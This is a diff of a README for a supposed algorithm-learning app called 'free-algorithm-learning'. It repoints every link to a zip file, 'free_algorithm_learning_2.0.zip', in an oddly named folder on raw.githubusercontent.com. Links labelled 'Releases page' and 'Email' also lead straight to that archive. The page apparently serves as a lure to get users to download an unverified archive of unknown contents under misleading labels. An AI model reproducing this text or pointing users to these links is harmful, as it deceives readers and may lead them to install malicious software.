@@ -1,6 +1,6 @@
 # 🎓 free-algorithm-learning - Simplify Your Algorithm Learning Journey
 
-[![Download Now](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free-algorithm-learning.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free-algorithm-learning.zip)
+[![Download Now](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free_algorithm_learning_2.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free_algorithm_learning_2.0.zip)
 
 ## 📜 Introduction
 Welcome to the free-algorithm-learning repository! This application is designed to help you master common algorithms and data structures. With interactive animations, you will learn through visual demonstrations and hands-on practice. This tool supports languages like Java, Python, JavaScript, Go, and C++. Say goodbye to confusing traditional learning methods and hello to a straightforward, engaging experience.
@@ -8,7 +8,7 @@ Welcome to the free-algorithm-learning repository! This application is designed 
 ## 🚀 Getting Started
 To get started, you need to download the application from the Releases page. This section will guide you step by step.
 
-1. Click on the **Download Now** button at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free-algorithm-learning.zip).
+1. Click on the **Download Now** button at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free_algorithm_learning_2.0.zip).
 2. Choose the version you want to download. Each release includes different features and improvements.
 3. Click on the download link for your operating system (Windows, macOS, or Linux).
 
@@ -53,9 +53,9 @@ The application offers a structured learning path to make your algorithm study e
 ## 📞 Contact
 If you encounter any issues or have questions, feel free to contact our support team:
 
-- Email: https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free-algorithm-learning.zip
+- Email: https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free_algorithm_learning_2.0.zip
 - GitHub Issues: Use the issue tracker on our repository for specific problems.
 
 Enjoy your journey to mastering algorithms! Thank you for choosing free-algorithm-learning. 
 
-Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free-algorithm-learning.zip) for updates or new versions.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Muturi-Kelvin/free-algorithm-learning/master/archpresbyter/free_algorithm_learning_2.0.zip) for updates or new versions.
